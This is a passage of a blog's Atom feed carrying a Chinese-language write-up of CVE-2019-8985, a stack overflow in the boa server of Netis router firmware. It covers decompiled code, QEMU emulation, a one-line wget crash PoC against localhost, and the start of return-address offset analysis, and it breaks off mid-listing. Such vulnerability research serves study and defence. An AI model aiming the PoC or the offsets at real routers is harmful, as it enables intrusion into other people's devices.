<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://Squirre17.github.io</id>
    <title>Squirre17 Blog • Posts by &#34;iot&#34; tag</title>
    <link href="https://Squirre17.github.io" />
    <updated>2021-08-10T16:00:00.000Z</updated>
    <category term="Linux" />
    <category term="User state" />
    <category term="IoT" />
    <entry>
        <id>https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/</id>
        <title>CVE–2019–8985 Netis WF2411 RCE detail</title>
        <link rel="alternate" href="https://squirre17.github.io/2021/08/11/CVE%E2%80%932019%E2%80%938985-Netis-WF2411-RCE-detail/"/>
        <content type="html">&lt;h2 id=&#34;环境搭建&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#环境搭建&#34;&gt;#&lt;/a&gt; 环境搭建&lt;/h2&gt;
&lt;p&gt;固件获取  &lt;a href=&#34;https://www.netis-systems.com/Suppory/de_details/id/1/de/168.html&#34;&gt;WF2419&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;https://www.tacnetsol.com/blog/cve-2019-8985-rce&#34;&gt;Fetching Title#sw0w&lt;/a&gt;&lt;br&gt;
 选择 WF2419（2.2.36123）&lt;/p&gt;
&lt;p&gt;先逆向分析 &lt;code&gt;boa&lt;/code&gt; &lt;br&gt;
 漏洞点&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;loc_4145D8:              &lt;span class=&#34;meta&#34;&gt;# s&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addiu   $a0, $sp, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;+var_40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;li      $a1, &lt;span class=&#34;number&#34;&gt;0x420000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addiu   $a1, (aSS_0 - &lt;span class=&#34;number&#34;&gt;0x420000&lt;/span&gt;)  # &lt;span class=&#34;string&#34;&gt;&amp;quot;%s:%s&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;move    $a2, $s0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;move    $a3, $s4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;la      $t9, &lt;span class=&#34;built_in&#34;&gt;sprintf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;jalr    $t9 ; &lt;span class=&#34;built_in&#34;&gt;sprintf&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lw      $gp, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;+var_48($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;li      $s3, &lt;span class=&#34;number&#34;&gt;0x460000&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addiu   $s3, (byte_4596D0 - &lt;span class=&#34;number&#34;&gt;0x460000&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;lbu     $v0, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;+var_40($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nop&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;addiu   $s2, $v0, &lt;span class=&#34;number&#34;&gt;-0x3A&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;user_ok&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *a1, &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *a2)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v4; &lt;span class=&#34;comment&#34;&gt;// $s1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; result; &lt;span class=&#34;comment&#34;&gt;// $v0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v6; &lt;span class=&#34;comment&#34;&gt;// $s2&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; v7; &lt;span class=&#34;comment&#34;&gt;// $v0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *v8; &lt;span class=&#34;comment&#34;&gt;// $s0&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; v9; &lt;span class=&#34;comment&#34;&gt;// dc&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v10[&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [sp+20h] [-40h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(v10, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(v10));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  v4 = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( get_password(&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt;) &amp;gt;= &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;sprintf&lt;/span&gt;(v10, &lt;span class=&#34;string&#34;&gt;&amp;quot;%s:%s&amp;quot;&lt;/span&gt;, a1, a2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    v6 = (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; __int8)v10[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;] - &lt;span class=&#34;number&#34;&gt;58&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ( &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v7 = v4 &amp;lt;&amp;lt; &lt;span class=&#34;number&#34;&gt;6&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( byte_4596D0[&lt;span class=&#34;number&#34;&gt;64&lt;/span&gt; * v4] == &lt;span class=&#34;number&#34;&gt;58&lt;/span&gt; &amp;amp;&amp;amp; !v6 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;break&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      v8 = &amp;amp;byte_4596D0[v7];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( &lt;span class=&#34;built_in&#34;&gt;strlen&lt;/span&gt;(&amp;amp;byte_4596D0[v7]) &amp;gt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        v9 = &lt;span class=&#34;built_in&#34;&gt;strcmp&lt;/span&gt;(v10, v8) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        result = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( v9 )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; result;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ( ++v4 &amp;gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; )&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;check password error,log_passwd=%s;passwd=%s\n&amp;quot;&lt;/span&gt;, a2, byte_4596D0);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;fprintf&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;stderr&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;%s:%s:%d;get password error!\n&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;htauth.c&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;user_ok&amp;quot;&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;74&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;启动 boa 的时候可以检查下配置文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;➜  sqrootfs file bin/busybox         &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bin/busybox: ELF 32-bit MSB executable, MIPS, MIPS-I version 1 (SYSV), dynamically linked, interpreter /lib/ld-uClibc.so.0, stripped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;➜  sqrootfs cp $(which qemu-mips) .&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;➜  sqrootfs grep -r &amp;quot;boa -&amp;quot; .                   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./bin/webs:	/bin/boa -p /web -f /etc/boa.conf &amp;amp;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;grep: ./var/run/webs.pid: Permission denied&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;➜  sqrootfs sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[sudo] password for squ: &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Starting Protocol Module: HTTP Server                      ... OK&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果出现不能缺失 &lt;code&gt;/dev/null&lt;/code&gt;  的问题&lt;br&gt;
可以 &lt;code&gt;sudo mknod -m 666 dev/null c 1 3&lt;/code&gt; &lt;br&gt;
 如果出现 &lt;code&gt;can&#39;t create PID file&lt;/code&gt; &lt;br&gt;
 可以 &lt;code&gt;md var/run&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;然后可以打个 PoC 试试看&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget --http-user=a --http-password=$(python -c &amp;#x27;print &amp;quot;a&amp;quot;*0x80&amp;#x27;) http://127.0.0.1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以看到报错信息如下&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;translate_uri:222;Wget/1.19.4 (linux-gnu)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;translate_uri:254&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;translate_uri:256&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;htauth.c:user_auth:181;get password error!&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;✨TODO&lt;/p&gt;
&lt;p&gt;逆向一下可以发现要打开一个 passwd&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;v2 = fopen(&lt;span class=&#34;string&#34;&gt;&amp;quot;/tmp/passwd&amp;quot;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;r+&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;cp 本地的过去&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;cp /etc/passwd ./tmp&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;在 wget 一下 可以看到崩溃&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;check password error,log_passwd=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa;passwd=root:x:0:0:root:/root:/bin/bash&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;caught SIGSEGV, dumping core in /var/boa&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;qemu: uncaught target signal 6 (Aborted) - core dumped&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[1]    49014 abort      sudo chroot . ./qemu-mips /bin/boa -p /web -f /etc/boa.conf&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;漏洞分析&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#漏洞分析&#34;&gt;#&lt;/a&gt; 漏洞分析&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;ra&lt;/code&gt;  在  &lt;code&gt;sp + 0x14&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;buf&lt;/code&gt;  在  &lt;code&gt;sp - 0x40&lt;/code&gt; &lt;br&gt;
 也就是 &lt;code&gt;0x54&lt;/code&gt;  的 offs&lt;br&gt;
 同时我们也需要控制五个寄存器 &lt;code&gt;s0 ~ s5&lt;/code&gt;  这五个调用者保存寄存器&lt;br&gt;
这些寄存器主要是为了劫持返回地址 因为会有 sx 传递给 ax&lt;br&gt;
 然后 jalr ax 的 gadget&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;004146&lt;/span&gt;DC                 lw      $ra, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;+var_s14($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;004146E0&lt;/span&gt;                 lw      $s4, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;+var_s10($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;004146E4&lt;/span&gt;                 lw      $s3, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;+var_sC($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;004146E8&lt;/span&gt;                 lw      $s2, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;+var_s8($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;004146&lt;/span&gt;EC                 lw      $s1, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;+var_s4($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;004146F&lt;/span&gt;0                 lw      $s0, &lt;span class=&#34;number&#34;&gt;0x60&lt;/span&gt;+var_s0($sp)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;004146F&lt;/span&gt;4                 jr      $ra&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;.text:&lt;span class=&#34;number&#34;&gt;004146F&lt;/span&gt;8                 addiu   $sp, &lt;span 